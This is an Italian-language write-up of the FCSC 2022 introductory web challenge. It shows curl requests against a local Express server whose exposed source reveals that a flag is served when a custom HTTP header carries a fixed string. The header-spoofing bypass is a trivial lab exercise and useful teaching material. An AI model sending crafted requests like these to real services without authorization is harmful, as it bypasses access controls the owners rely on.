# Header

**Competizione:** FCSC 2022 (Intro) <br>
**Categoria:** Web <br>
**Servizio:** `localhost:8000`

---

## Descrizione

> "Pour cette épreuve, vous devrez vous pencher sur une fonctionnalité essentielle du protocole HTTP."

Il titolo e la descrizione sono già tutto: la vulnerabilità è negli **HTTP header**.

---

## Soluzione

### 1. Ricognizione iniziale

```bash
curl -v http://localhost:8000
```

La risposta è una pagina HTML con il messaggio:

```
No flag for you. Want a meme instead?
```

Header di risposta notevoli:

```
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
```

È un'app **Express/Node.js**. Nella navbar si vede un link `/source`: fonte di codice esposta, ottimo punto di partenza.

---

### 2. Analisi del sorgente

```bash
curl http://localhost:8000/source
```

Il codice Node.js rilevante:

```javascript
app.get('/', async (req, res) => {
    var verif = req.header("X-FCSC-2022");
    if (verif == "Can I get a flag, please?") {
        var flag = fs.readFileSync("flag.txt");
        res.render("pages/index", {
            type: "success",
            msg: "Here it is: " + flag,
        });
    } else {
        res.render("pages/index", {
            type: "warning",
            msg: "No flag for you. Want a meme instead?",
        });
    }
});
```

**Vulnerabilità individuata:** il server legge l'header HTTP custom `X-FCSC-2022` e lo confronta con la stringa `"Can I get a flag, please?"`. Se il confronto è positivo, serve il flag direttamente nel corpo HTML.

Non c'è autenticazione, nessun token, nessuna sessione: basta inviare l'header corretto.

---

### 3. Exploit

```bash
curl -H "X-FCSC-2022: Can I get a flag, please?" http://localhost:8000
```

**Risposta:**

```html
<div id="alert" class="alert alert-success">
    <strong>Here it is: FCSC{...}</strong>
</div>
```

---

## Flag

```
FCSC{...}
```

---

## Conclusioni

Challenge di ricognizione HTTP elementare. La catena è:

1. Codice sorgente esposto su `/source` → rivela la logica del controllo
2. Il server verifica l'header custom `X-FCSC-2022` con confronto in chiaro (`==`)
3. `curl -H` inietta l'header corretto → flag servito nel body HTML